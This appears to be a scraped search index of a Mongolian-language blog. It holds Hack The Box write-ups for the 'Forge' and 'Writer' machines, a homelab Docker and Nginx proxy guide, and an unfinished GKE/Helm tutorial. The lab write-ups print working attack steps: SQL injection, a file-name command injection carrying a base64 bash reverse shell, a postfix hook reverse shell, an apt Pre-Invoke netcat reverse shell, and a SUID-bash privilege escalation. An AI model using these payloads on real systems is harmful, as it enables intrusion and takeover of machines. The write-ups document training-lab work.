\u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;Welcome Admins!\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; http://ADMIN.FORGE.HTB/announcements\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Announcements\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/css/main.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;/static/css/announcements.css\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;h1 class=\u0026#34;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Portal home\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;align-right margin-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/announcements\u0026#34;\u0026gt;Announcements\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h1 class=\u0026#34;align-right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;/upload\u0026#34;\u0026gt;Upload image\u0026lt;/a\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=\u0026amp;lt;url\u0026amp;gt;.\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; user:heightofsecurity123!\nhttp://aDmin.forGe.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Oct 30 18:02 user.txt http://aDmin.forGe.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa id_rsa:\n-----BEGIN OPENSSH PRIVATE KEY----- PRIVATE KEY -----END OPENSSH PRIVATE KEY----- User:\n16eeaf74************* 6. Enumeration sudo -l:\nUser user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py remote-manage.py - ашиглах боломжтой. Порт listen хийж байгаад \u0026lt;pdb\u0026gt; руу орохын тулд шинэ терминал сешн нээгээд ssh дахин нэвтрээд nc localhost \u0026lt;port\u0026gt; listen хийнэ. Эхний терминал сешн дээрээс pdb руу юу ч хамаагүй бичээд орно.\n7. Exploitation import os os.system (\u0026#39;chmod u+s /bin/bash\u0026#39;) exit Root руу орохдоо:\n/bin/bash -p ","permalink":"https://cadil.github.io/posts/2024-02-20-htb-forge-writeup/","summary":"1. IP Address # Machine Address 10.10.11.111 # Local Address 10.10.14.12 2. Nmap sudo nmap -sC -sV -oA nmap/forge 10.10.11.111 Output:\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-30 22:18 EDT Nmap scan report for forge.htb (10.10.11.111) Host is up (0.22s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Forge"},{"content":"1. IP Address # Machine Address 10.10.11.101 # Local Address 10.10.14.31 2. Nmap sudo nmap -sC -sV -oA nmap/writer 10.10.11.101 # Nmap 7.91 scan initiated Fri Sep 3 10:52:33 2021 as: nmap -sC -sV -oA nmap/writer 10.10.11.101 Nmap scan report for 10.10.11.101 Host is up (0.21s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 13m54s |_nbstat: NetBIOS name: WRITER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-03T15:06:47 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 3 10:52:58 2021 -- 1 IP address (1 host up) scanned in 25.18 seconds 3. Gobuster gobuster dir -u http://10.10.11.101 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out /contact (Status: 200) [Size: 4905] /logout (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /about (Status: 200) [Size: 3522] /static (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.101/static/] /. (Status: 200) [Size: 11976] /dashboard (Status: 302) [Size: 208] [--\u0026gt; http://10.10.11.101/] /server-status (Status: 403) [Size: 277] /administrative (Status: 200) [Size: 1443] administrative\n4. SQLMap SQL Injection үзсэн, логин хийгээгүй:\n\u0026#39;or 1=1 -- - Тэхээр нь Burp логин хийж байгаа хүсэлтийг файл хэлбэрээр хадаглах:\nPOST /administrative HTTP/1.1 Host: 10.10.11.101 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 26 Origin: http://10.10.11.101 DNT: 1 Connection: close Referer: http://10.10.11.101/administrative Upgrade-Insecure-Requests: 1 Sec-GPC: 1 uname=admin\u0026amp;password=admin Терминал:\nsqlmap -r login.req --level 5 --risk 3 --threads 10 Үр дүн:\n--- Parameter: uname (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: uname=-1182\u0026#39; OR 8638=8638-- ITHB\u0026amp;password=admin --- Testing\nsqlmap -r login.req --dump-all Цаашаа уншаад хэрэгтэй зүйл буцаагаагүй. Хэрэгтэй output-г аваад логин хийж орсон.\n5. Image Upload init.py\nif request.form.get(\u0026#39;image_url\u0026#39;): image_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\u0026#34;mv {} {}.jpg\u0026#34;.format(local_filename, local_filename)) image = \u0026#34;{}.jpg\u0026#34;.format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;) os.system(\u0026#34;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image)) image = \u0026#34;/img/{}\u0026#34;.format(image) except PIL.UnidentifiedImageError: os.system(\u0026#34;rm {}\u0026#34;.format(image)) error = \u0026#34;Not a valid image file!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) Post хэсэгт image upload хийхээр болсон.\necho -n \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; | base64 touch \u0026#39;1.jpg; `echo \u0026lt;BASE64 ENCODED PAYLOAD\u0026gt; | base64 -d | bash `;\u0026#39; Бэлдээд stories хэсгийн зургийг re-upload хийнэ. Орсон эсэхийг static/img-с ороод шалган орсон байгаа бол энэ удаад burp - дамжуулж image_url хэсгийг өөрчилнө. Image нэр хэсэгт jpg хэсгийн ар талыг арилгав.\nfile:///var/www/writer.htb/writer/static/img/1.jpg; `echo \u0026lt;ENCHODED PAYLOAD\u0026gt; | base64 -d | bash `; 6. Enumeration Services шалгаж үзнэ\n### ss -tupln /etc/mysql/mariadb.cnf - с username, password хараж болохоор байна.\nwww-data@writer:$ cd /etc/mysql www-data@writer:/etc/mysql$ ls conf.d debian-start debian.cnf mariadb.cnf mariadb.conf.d my.cnf my.cnf.fallback www-data@writer:/etc/mysql$ cat mariadb.cnf # The MariaDB configuration file # # The MariaDB/MySQL tools read configuration files in the following order: # 1. \u0026#34;/etc/mysql/mariadb.cnf\u0026#34; (this file) to set global defaults, # 2. \u0026#34;/etc/mysql/conf.d/*.cnf\u0026#34; to set global options. # 3. \u0026#34;/etc/mysql/mariadb.conf.d/*.cnf\u0026#34; to set MariaDB-only options. # 4. \u0026#34;~/.my.cnf\u0026#34; to set user-specific options. # # If the same option is defined multiple times, the last one will apply. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use. # # This group is read both both by the client and the server # use it for options that affect everything # [client-server] # Import all .cnf files from configuration directory !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 Кyle-н нууг үг олох:\nmysql -u djangouser -h 127.0.0.1 -p DjangoSuperPassword show databases; use dev; show tables; SELECT * FROM auth_user; pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= hashcat ашгилаад тайлах бололтой. Мэдэхгүй болохоор бэлэн тайлсан үг ашиглсан. (marcoantonio)\nKyle-р дамжаад John руу\nssh kyle@writer.htb Мэйл илгээж disclaimer-р г trigger хийгээд дотор нь reverse shell хийнэ. /etc/postfix/disclaimer\nbash -i \u0026amp;\u0026gt;/dev/tcp/\u0026lt;YOUR IP\u0026gt;/\u0026lt;PORT\u0026gt; 0\u0026gt;\u0026amp;1 INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail Эхний мөр trigger хийнэ.\n#!/usr/bin/env python3 import smtplib host = \u0026#39;127.0.0.1\u0026#39; port = 25 From = \u0026#39;kyle@writer.htb\u0026#39; To = \u0026#39;john@writer.htb\u0026#39; Message = \u0026#39;\u0026#39;\u0026#39;\\ Subject: HI THERE! JOHN OOPS I GOT YOU MATE. \u0026#39;\u0026#39;\u0026#39; try: io = smtplib.SMTP(host,port) io.ehlo() io.sendmail(From,To,Message) except Exceptions as e: print (e) finally: io.quit() python3 script.py nc асаагаад тэгээд John руу орохыг хүлээнэ. John ороод id_rsa авна. Хуулж аваад ssh хийхээс өмнө chmod 600 хийгээд нэвтрэн орно.\nssh -i id_rsa john@writer.htb John /etc/apt/apt.conf.d - бичилт хийх боломжтой байна. Management group-т байна.\npspy64s суулгана. Local\nmkdir www cd www mv ~/dir/pspy64s . python3 -m http.server Machine\ncurl \u0026lt;local ip\u0026gt;:8000/pspy64s -o pspy64s chmod +x pspy64s ./pspy64s 7. Exploitation https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/\necho \u0026#39;apt::Update::Pre-Invoke {\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc \u0026lt;YOUR IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt;/tmp/f\u0026#34;};\u0026#39; \u0026gt; /etc/apt/apt.conf.d/00-pwn ","permalink":"https://cadil.github.io/posts/2024-02-17-htb-winter-writeup/","summary":"1. IP Address # Machine Address 10.10.11.101 # Local Address 10.10.14.31 2. Nmap sudo nmap -sC -sV -oA nmap/writer 10.10.11.101 # Nmap 7.91 scan initiated Fri Sep 3 10:52:33 2021 as: nmap -sC -sV -oA nmap/writer 10.10.11.101 Nmap scan report for 10.10.11.101 Host is up (0.21s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.","title":"HTB - Winter"},{"content":"OS Almalinux 8.9 minimal ISO суулгасан. Суулгах явцад root-с тусад нь user үүсгэн wheel группд нэмсэн.\n# hostnamectl Icon name: computer-laptop Chassis: laptop Operating System: AlmaLinux 8.9 (Midnight Oncilla) CPE OS Name: cpe:/o:almalinux:almalinux:8::baseos Kernel: Linux 4.18.0-513.9.1.el8_9.x86_64 Architecture: x86-64 # lshw vendor: LENOVO version: ThinkPad R500 cpu: Celeron(R) Dual-Core CPU T3100 @ 1.90GHz ram: 8G DDR2 800MHz Docker \u0026amp; docker compose Суулгах\nsudo dnf upgrade sudo dnf install yum-utils sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo dnf install docker-ce docker-ce-cli containerd.io docker-compose-plugin # Complete бол сервис асаана sudo systemctl start docker sudo systemctl enable docker # check version docker --version # Docker version 24.0.7, build afdd53b docker-compose --version # Docker Compose version v2.12.2 Compose ажиллахгүй бол энэ аргаар суулгана:\ncurl -L \u0026#34;https://github.com/docker/compose/releases/download/v2.12.2/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/bin/docker-compose chmod +x /usr/bin/docker-compose Non root user бол docker group үүсгээд sudo үүсгэх боломжтой болгоорой.\n# Add alma user to wheel group sudo usermod -aG wheel alma # Add alma user to docker group sudo usermod -aG docker alma # groups alma wheel docker # id uid=1000(alma) gid=1000(alma) groups=1000(alma),10(wheel),992(docker) Docker compose nginxproxymanager, nextcloud, homeassistant, jellyfin, odoo+postgres docker compose бүрдэнэ. Nginx proxy manager дээр HTTPS (Let\u0026rsquo;s encrypt) авахад бас DuckDNS domain авахад ашиглана. Docker network-оо дундаа ашиглана. 3 port docker -с host руу 80, 81, 443 expose хийсэн.\nversion: \u0026#39;2.2\u0026#39; services: nginxproxymanager: image: \u0026#39;jc21/nginx-proxy-manager:latest\u0026#39; container_name: nginxproxymanager restart: unless-stopped ports: - \u0026#39;80:80\u0026#39; - \u0026#39;81:81\u0026#39; - \u0026#39;443:443\u0026#39; volumes: - ./nginx/data:/data - ./nginx/letsencrypt:/etc/letsencrypt # default cred: admin@example.com, changeme nextcloud: image: lscr.io/linuxserver/nextcloud:latest container_name: nextcloud environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar volumes: - ./nextcloud/appdata:/config - ./nextcloud/data:/data restart: unless-stopped homeassistant: image: lscr.io/linuxserver/homeassistant:latest container_name: homeassistant environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar volumes: - ./hass/config:/config restart: unless-stopped jellyfin: image: lscr.io/linuxserver/jellyfin:latest container_name: jellyfin environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar volumes: - ./jellyfin/config:/config - ./jellyfin/tvshows:/data/tvshows - ./jellyfin/movies:/data/movies restart: unless-stopped postgresql: image: docker.io/bitnami/postgresql:16 container_name: postgresql environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar - ALLOW_EMPTY_PASSWORD=yes - POSTGRESQL_USERNAME=bn_odoo - POSTGRESQL_DATABASE=bitnami_odoo volumes: - ./postgresql/postgresql-persistence:/bitnami/postgresql restart: unless-stopped odoo: image: docker.io/bitnami/odoo:17 container_name: odoo environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar - ALLOW_EMPTY_PASSWORD=yes - ODOO_DATABASE_HOST=postgresql - ODOO_DATABASE_PORT_NUMBER=5432 - ODOO_DATABASE_USER=bn_odoo - ODOO_DATABASE_NAME=bitnami_odoo volumes: - ./odoo/odoo-persistence:/bitnami/odoo depends_on: - postgresql restart: unless-stopped # default cred: user@example.com, bitnami navidrome: image: deluan/navidrome:latest container_name: navidrome environment: - PUID=1000 - PGID=1000 - TZ=Asia/Ulaanbaatar - ND_SCANSCHEDULE=1h - ND_LOGLEVEL=info - ND_SESSIONTIMEOUT=24h volumes: - ./navidrome/data:/data - ./navidrome/music:/music:ro restart: unless-stopped # mobile client: Using Tempo Compose run:\ndocker-compose up -d docker ps:\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0f35e9aafd25 bitnami/odoo:17 \u0026#34;/opt/bitnami/script…\u0026#34; 6 minutes ago Up 6 minutes 3000/tcp, 8069/tcp, 8072/tcp odoo 91faa3c03087 lscr.io/linuxserver/homeassistant:latest \u0026#34;/init\u0026#34; 6 minutes ago Up 6 minutes 8123/tcp homeassistant a2aa28911120 lscr.io/linuxserver/nextcloud:latest \u0026#34;/init\u0026#34; 6 minutes ago Up 6 minutes 80/tcp, 443/tcp nextcloud 89039950eded bitnami/postgresql:16 \u0026#34;/opt/bitnami/script…\u0026#34; 6 minutes ago Up 6 minutes 5432/tcp postgresql a2c89d8405bf jc21/nginx-proxy-manager:latest \u0026#34;/init\u0026#34; 6 minutes ago Up 6 minutes 0.0.0.0:80-81-\u0026gt;80-81/tcp, :::80-81-\u0026gt;80-81/tcp, 0.0.0.0:443-\u0026gt;443/tcp, :::443-\u0026gt;443/tcp nginxproxymanager 029423ea3e20 lscr.io/linuxserver/jellyfin:latest \u0026#34;/init\u0026#34; 6 minutes ago Up 6 minutes 8096/tcp, 8920/tcp jellyfin 50e71ed94692 deluan/navidrome:latest \u0026#34;/app/navidrome\u0026#34; 6 minutes ago Up 6 minutes (healthy) 4533/tcp navidrome Port нээх docker expose хийсэн портуудыг хост талдаа нээнэ.\n# Host port нээх sudo firewall-cmd --zone=public --add-service=http --permanent sudo firewall-cmd --zone=public --add-port 8080/tcp --permanent # reload хийх sudo firewall-cmd --reload # port шалгах sudo firewall-cmd --zone=public --list-ports Host-д persist хийгдсэн volume #pwd /home/alma/docker/compose #ls -la -d * */* -rw-rw-r--. 1 alma alma 2022 Jan 18 00:59 docker-compose.yml drwxr-xr-x. 3 root root 20 Jan 6 01:49 hass drwxr-xr-x. 8 alma alma 4096 Jan 18 01:21 hass/config drwxr-xr-x. 5 root root 49 Jan 6 01:49 jellyfin drwxr-xr-x. 6 alma alma 179 Jan 16 09:28 jellyfin/config drwxr-xr-x. 2 alma alma 4096 Jan 14 07:43 jellyfin/movies drwxr-xr-x. 4 alma alma 54 Jan 14 07:43 jellyfin/tvshows drwxr-xr-x. 4 root root 33 Jan 6 01:49 nextcloud drwxr-xr-x. 7 alma alma 95 Jan 6 02:30 nextcloud/appdata drwxrwx---. 5 alma alma 158 Jan 18 06:30 nextcloud/data drwxr-xr-x. 4 root root 37 Jan 6 01:49 nginx drwxr-xr-x. 7 root root 137 Jan 18 06:02 nginx/data drwxr-xr-x. 8 root root 104 Jan 18 06:02 nginx/letsencrypt drwxr-xr-x. 3 root root 30 Jan 17 23:28 odoo drwxrwxr-x. 5 systemd-coredump root 44 Jan 18 01:01 odoo/odoo-persistence drwxr-xr-x. 3 root root 36 Jan 18 00:54 postgresql drwxr-xr-x. 3 1001 1001 18 Jan 18 00:58 postgresql/postgresql-persistence drwxr-xr-x. 4 root root 31 Mar 2 15:02 navidrome drwxr-xr-x. 3 root root 87 Mar 2 15:02 navidrome/data drwxr-xr-x. 2 root root 6 Mar 2 15:02 navidrome/music non-root container-н хувьд permission алдаа заавал, жишээ нь postgresql:\nsudo chown -R 1001:1001 postgresql/postgresql-persistence Permission denied хийж байвал:\n# jellyfin sudo chown -R alma:alma movies sudo chmod -R 755 movies #tvshows # navidrome sudo chown -R alma:alma music sudo chmod -R 755 music Nginx proxy manager http://server-ip:81 хандан default creds-р (admin@example.com pass: changeme) нэвтэрнэ. Дараа нь DuckDNS бүртгүүлээд sub domain (жишээ нь hosono.duckdns.org г.м) авна. Current IP хэсэгт host-н IP (192.168.1.200 г.м) save хийнэ дээд хэсэгт token -copy хийнэ.\nNginx proxy manager -\u0026gt; SSL Certificate -\u0026gt; Add Let\u0026rsquo;s Encrypt Certificate -\u0026gt; Let\u0026rsquo;s Encrypt орон Domain Names хэсэгт DuckDNS авсан domain-аа (*.hosono.duckdns.org болон hosono.duckdns.org) оруулна. Email хэсэгт мэдэгдэл авах мэйл хаягаа оруулна. Use a DNS Challenge -г enable хийгээд DuckDNS сонгоод dns_duckdns_token=өмнө copy хийсэн token-oo энд paste хийнэ. Propagation Seconds хэсэгт 120 гэж бичээд save. Алдаа заавал дахин save хийнэ.\nProxy entry hosono.duckdns.org -г http://nginxproxymanager:81 jellyfin.hosono.duckdns.org -г http://jellyfin:8096 гэх мэтээр Certificate тохируулахад Proxy host-ууд бүртгэнэ.\nDomain Names хэсэгт бүртгэж буй sub domain-аа бичин, Scheme хэсэгт http https -с сонгоно. container талаас 443 default хийгдээгүй л бол ихэхндээ http -г сонгоно. Forward Hostname / IP хэсэгт container name эсхүл 127.0.0.1 байж болно.\nSSL хэсэгт SSL Certificate -д бүртгэсэн DuckDNS -с сонгоод Force SSL, HTTP/2 Support гэдгийг сонгоод хадаглах юм. Энэ мэтээр subdomain -уудаа бүртгэнэ.\nSOURCE DESTINATION SSL ACCESS STATUS home.hosono.duckdns.org http://homeassistant:8123 Let\u0026rsquo;s Encrypt Public Online hosono.duckdns.org http://nginxproxymanager:81 Let\u0026rsquo;s Encrypt Public Online jellyfin.hosono.duckdns.org http://jellyfin:8096 Let\u0026rsquo;s Encrypt Public Online nextcloud.hosono.duckdns.org https://nextcloud:443 Let\u0026rsquo;s Encrypt Public Online odoo.hosono.duckdns.org http://odoo:8069 Let\u0026rsquo;s Encrypt Public Online navidrome.hosono.duckdns.org http://navidrome:4533 Let\u0026rsquo;s Encrypt Public Online HA http://homeassistant:8123 хувьд Proxy бүртгэх дээ Websockets Supports гэдгийг чагтлан өгнө. Дараа нь npm ажиллаж байгаа IP хаягийн мэдээллийг аван HASS дотор configuration.yml -г trusted_proxy хэсэгт npm нэмэн оруулна\ndocker inspect nginxproxymanager ... \u0026#34;IPAddress\u0026#34;: \u0026#34;172.23.0.2\u0026#34; ... # /home/user/docker/compose/hass/config vi configuration.yaml ... http: use_x_forwarded_for: true trusted_proxies: - 172.23.0.0/24 # - 172.23.0.5 ... configuration.yaml save хийгээд homeassistant restart хийнэ:\ndocker restart homeassistant Watchtower Гараар container-ууд update хийнэ. /Docker-compose дотор байнга ажилладаг байхаар тохируулж бас болно/\ndocker run -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once Bookmarks https://youtu.be/qlcVx-k-02E https://notthebe.ee/blog/easy-ssl-in-homelab-dns01/ https://github.com/bitnami/containers/tree/main/bitnami/odoo#configuration https://linux.how2shout.com/how-to-open-or-close-ports-in-almalinux-8-or-rocky-firewall/ https://techoverflow.net/2020/01/28/how-to-fix-bitnami-mariadb-mkdir-cannot-create-directory-bitnami-mariadb-permission-denied/ https://github.com/containrrr/watchtower/discussions/901 https://containrrr.dev/watchtower/ https://github.com/navidrome/navidrome https://www.navidrome.org/docs/installation/docker/ /docker/ https://github.com/CappielloAntonio/tempo /Using android client for Navidrome/ ","permalink":"https://cadil.github.io/posts/2024-01-18-docker-thinkpadr500/","summary":"OS Almalinux 8.9 minimal ISO суулгасан. Суулгах явцад root-с тусад нь user үүсгэн wheel группд нэмсэн.\n# hostnamectl Icon name: computer-laptop Chassis: laptop Operating System: AlmaLinux 8.9 (Midnight Oncilla) CPE OS Name: cpe:/o:almalinux:almalinux:8::baseos Kernel: Linux 4.18.0-513.9.1.el8_9.x86_64 Architecture: x86-64 # lshw vendor: LENOVO version: ThinkPad R500 cpu: Celeron(R) Dual-Core CPU T3100 @ 1.90GHz ram: 8G DDR2 800MHz Docker \u0026amp; docker compose Суулгах\nsudo dnf upgrade sudo dnf install yum-utils sudo yum-config-manager --add-repo https://download.","title":"Thinkpad R500-д Almalinux 8 OS + Docker + Nginx proxy manager + SSL certificate + DuckDNS"},{"content":"GKE дээр Helm, Күбернетес ашиглан жишээ апплкейшн суулгаж тохируулах Google Kubernetes Engine дээр кластер үүсгэх Helm, Tiller суулгах TLS Key үүсгэх Odoo-г суулгах Google Kubernetes Engine дээр кластер үүсгэх Google Cloud Platform дээр Google Kubernetes Engine дээр кластер үүсгэх Helm Chart суулгаж TLS, Cert-Manager суулган тохируулж сүүлд нь Odoo-г суулгаж үзнэ.\ngcloud суулгах kubectl суулгах gcloud дамжуулан GCP - тэй холбогдоно. Google Cloud Platform - бүртгэл байхгүй бол эхлээд бүртгүүлээрэй.\nkubectl gcloud суулгасан бол дээр байгаа гарын авлага ашиглахгүй kubectl суулгая гэвэл:\ngcloud components install kubectl Кластер үүсгэхээсээ ѳмнѳ нэвтрэн орно:\ngcloud auth application-default login Нэвтрэн орсон бол доорк коммандараар шинэ прожект үүсгэнэ:\ngcloud projects create ${PROJECT} Эсхүл заавал CLI-ээр үүсгэхгүй гэвэл GCP дээрээс browser дээрээс орон шинэ прожект үүсгэж болно. Терминал дээрээ ѳѳрийн тѳслийг default болгож zone тохиргоо хийх бол:\ngcloud config set project ${PROJECT} gcloud config set compute/zone ${ZONE} Zone жигсаалт авах бол: gcloud compute zones list\nОдоо шинээр үүсгэсэн тѳсѳл дотроо кластер үүсгэе. Google Kubernetes Engine -г идэвхжүүлээгүй бол эхлээд brwoser-ѳѳсѳѳ GCP -г ороод GKE-г enable хийх хийнэ. Kubernetes Engine -г ороод browser дээрээс анх удаа кластер үүсгэж байгаа хичээл болон жишиг кластер тохироог санал болгоно. Тэр аргаар нь үүсгэж болно. Эсхүл доор байгаа командаар үүсгэж болно.\ngcloud beta container --project ${PROJECT} clusters create \u0026#34;my-first-cluster-1\u0026#34; \\ --zone \u0026#34;us-central1-c\u0026#34; \\ --no-enable-basic-auth \\ --cluster-version \u0026#34;1.16.15-gke.4901\u0026#34; \\ --machine-type \u0026#34;e2-medium\u0026#34; \\ --image-type \u0026#34;COS\u0026#34; \\ --disk-type \u0026#34;pd-standard\u0026#34; \\ --disk-size \u0026#34;100\u0026#34; \\ --scopes \u0026#34;https://www.googleapis.com/auth/devstorage.read_only\u0026#34;,\u0026#34;https://www.googleapis.com/auth/logging.write\u0026#34;,\u0026#34;https://www.googleapis.com/auth/monitoring\u0026#34;,\u0026#34;https://www.googleapis.com/auth/servicecontrol\u0026#34;,\u0026#34;https://www.googleapis.com/auth/service.management.readonly\u0026#34;,\u0026#34;https://www.googleapis.com/auth/trace.append\u0026#34; \\ --no-enable-cloud-logging \\ --no-enable-cloud-monitoring \\ --no-enable-ip-alias \\ --network \u0026#34;projects/${PROJECT}/global/networks/default\u0026#34; \\ --subnetwork \u0026#34;projects/${PROJECT}/regions/us-central1/subnetworks/default\u0026#34; \\ --addons HorizontalPodAutoscaling \\ --enable-autoupgrade \\ --enable-autorepair \\ --enable-autoscaling \\ --num-nodes \u0026#34;2\u0026#34; \\ --min-nodes \u0026#34;2\u0026#34; \\ --max-nodes \u0026#34;5\u0026#34; zones: Кластер үүсгэж байгаа сервверийн байршил. machine-type: Кластерын үүсгэж байгаа тѳхѳѳрѳмжийн сонголт. Ямар тѳрлийн тѳхѳѳрѳмж сонгхож байгаагаас үнэ болон хэдэн node үүсгэх лимит зэрэгг тодорохйлогдоно. Дэлгэрэнгүй судлах бол: Machine Types. addons: Автоматаар буюу ачаалал их болох үед node ѳргѳтгѳл хийх тохиргоо оруулав: HorizontalPodAutoscaling. min-node: Автомат ѳргѳтгѳл хийж байх үед кластерт хамгийн бага байх node. max-node: Автомат ѳргѳтгѳл хийж байх үед кластерт хамгийн их байх node.\nШинээр үүсгэсэн кластерт role binding тохируулна:\ngcloud container clusters get-credentials ${Кластер нэр} kubectl create clusterrolebinding cluster-admin-binding \\ --clusterrole cluster-admin \\ --user $(gcloud config get-value account) Helm суулгах Helm суулгах:\ncurl https://raw.githubusercontent.com/helm/helm/master/scripts/get | bash kubectl create serviceaccount -n kube-system tiller kubectl create clusterrolebinding tiller-cluster-rule \\ --clusterrole=cluster-admin --serviceaccount=kube-system:tiller to be continued\u0026hellip;\n","permalink":"https://cadil.github.io/posts/2021-01-14-gke-kubernetes/","summary":"GKE дээр Helm, Күбернетес ашиглан жишээ апплкейшн суулгаж тохируулах Google Kubernetes Engine дээр кластер үүсгэх Helm, Tiller суулгах TLS Key үүсгэх Odoo-г суулгах Google Kubernetes Engine дээр кластер үүсгэх Google Cloud Platform дээр Google Kubernetes Engine дээр кластер үүсгэх Helm Chart суулгаж TLS, Cert-Manager суулган тохируулж сүүлд нь Odoo-г суулгаж 